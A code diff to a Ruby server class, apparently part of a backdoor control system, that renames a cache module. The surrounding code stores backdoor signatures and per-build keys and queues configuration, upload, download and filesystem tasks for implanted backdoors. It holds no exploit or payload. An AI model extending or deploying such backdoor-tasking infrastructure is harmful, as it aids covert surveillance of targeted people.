@@ -5,7 +5,7 @@
 # relatives
 require_relative 'config.rb'
 require_relative 'db_xmlrpc.rb'
-require_relative 'cache.rb'
+require_relative 'db_cache.rb'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -116,13 +116,13 @@ class DB
 
       trace :info, "Emptying the DB cache..."
       # empty the cache and populate it again
-      Cache.empty!
+      DBCache.empty!
 
       trace :info, "Populating the DB cache..."
       # save in the permanent cache
-      Cache.signature = sig
+      DBCache.signature = sig
       trace :info, "Backdoor signature saved in the DB cache"
-      Cache.add_class_keys @class_keys
+      DBCache.add_class_keys @class_keys
       trace :info, "#{@class_keys.length} entries saved in the the DB cache"
 
       return true
@@ -130,12 +130,12 @@ class DB
 
     # the db is not available
     # check if the cache already exists and has some entries
-    if Cache.length > 0 then
+    if DBCache.length > 0 then
       trace :info, "Loading the DB cache..."
 
       # populate the memory cache from the permanent one
-      @backdoor_signature = Digest::MD5.digest Cache.signature unless Cache.signature.nil?
-      @class_keys = Cache.class_keys
+      @backdoor_signature = Digest::MD5.digest DBCache.signature unless DBCache.signature.nil?
+      @class_keys = DBCache.class_keys
 
       trace :info, "#{@class_keys.length} entries loaded from DB cache"
 
@@ -171,7 +171,7 @@ class DB
       # store it in the permanent cache
       entry = {}
       entry[build_id] = key
-      Cache.add_class_keys entry
+      DBCache.add_class_keys entry
 
       # return the key
       return Digest::MD5.digest @class_keys[build_id]
@@ -206,7 +206,7 @@ class DB
   def new_conf?(bid)
     # check if we have the config in the cache
     # probably and old one not yet sent
-    return true if Cache.new_conf? bid
+    return true if DBCache.new_conf? bid
     # cannot reach the db, return false
     return false unless @available
 
@@ -214,14 +214,14 @@ class DB
     cid, config = db_call :new_conf, bid
 
     # put the config in the cache
-    Cache.save_conf bid, cid, config unless config.nil?
+    DBCache.save_conf bid, cid, config unless config.nil?
 
     return (config.nil?) ? false : true
   end
 
   def new_conf(bid)
     # retrieve the config from the cache
-    cid, config = Cache.new_conf bid
+    cid, config = DBCache.new_conf bid
 
     return nil if config.nil?
 
@@ -229,7 +229,7 @@ class DB
     db_call :conf_sent, cid if @available
 
     # delete the conf from the cache
-    Cache.del_conf bid
+    DBCache.del_conf bid
 
     return config
   end
@@ -237,7 +237,7 @@ class DB
   def new_uploads?(bid)
     # check if we have the uploads in the cache
     # probably and old one not yet sent
-    return true if Cache.new_uploads? bid
+    return true if DBCache.new_uploads? bid
     # cannot reach the db, return false
     return false unless @available
 
@@ -245,14 +245,14 @@ class DB
     uploads = db_call :new_uploads, bid
 
     # put the config in the cache
-    Cache.save_uploads bid, uploads unless uploads.empty?
+    DBCache.save_uploads bid, uploads unless uploads.empty?
 
     return (uploads.empty? or uploads.nil?) ? false : true
   end
 
   def new_uploads(bid)
     # retrieve the uploads from the cache
-    upload, left = Cache.new_upload bid
+    upload, left = DBCache.new_upload bid
 
     return nil if upload.nil?
 
@@ -260,7 +260,7 @@ class DB
     db_call :del_upload, upload[:id] if @available
 
     # delete the conf from the cache
-    Cache.del_upload upload[:id]
+    DBCache.del_upload upload[:id]
 
     return upload[:upload], left
   end
@@ -268,7 +268,7 @@ class DB
   def new_downloads?(bid)
     # check if we have the downloads in the cache
     # probably and old one not yet sent
-    return true if Cache.new_downloads? bid
+    return true if DBCache.new_downloads? bid
     # cannot reach the db, return false
     return false unless @available
 
@@ -276,14 +276,14 @@ class DB
     downloads = db_call :new_downloads, bid
 
     # put the config in the cache
-    Cache.save_downloads bid, downloads unless downloads.empty?
+    DBCache.save_downloads bid, downloads unless downloads.empty?
 
     return (downloads.empty?) ? false : true
   end
 
   def new_downloads(bid)
     # retrieve the downloads from the cache
-    downloads = Cache.new_downloads bid
+    downloads = DBCache.new_downloads bid
 
     return [] if downloads.empty?
 
@@ -297,7 +297,7 @@ class DB
     end
 
     # delete the conf from the cache
-    Cache.del_downloads bid
+    DBCache.del_downloads bid
 
     return down
   end
@@ -305,7 +305,7 @@ class DB
   def new_filesystems?(bid)
     # check if we have the filesystems in the cache
     # probably and old one not yet sent
-    return true if Cache.new_filesystems? bid
+    return true if DBCache.new_filesystems? bid
     # cannot reach the db, return false
     return false unless @available
 
@@ -313,14 +313,14 @@ class DB
     filesystems = db_call :new_filesystems, bid
 
     # put the config in the cache
-    Cache.save_filesystems bid, filesystems unless filesystems.empty?
+    DBCache.save_filesystems bid, filesystems unless filesystems.empty?
 
     return (filesystems.empty?) ? false : true
   end
 
   def new_filesystems(bid)
     # retrieve the filesystems from the cache
-    filesystems = Cache.new_filesystems bid
+    filesystems = DBCache.new_filesystems bid
 
     return [] if filesystems.empty?
 
@@ -334,7 +334,7 @@ class DB
     end
 
     # delete the conf from the cache
-    Cache.del_filesystems bid
+    DBCache.del_filesystems bid
 
     return files
   end
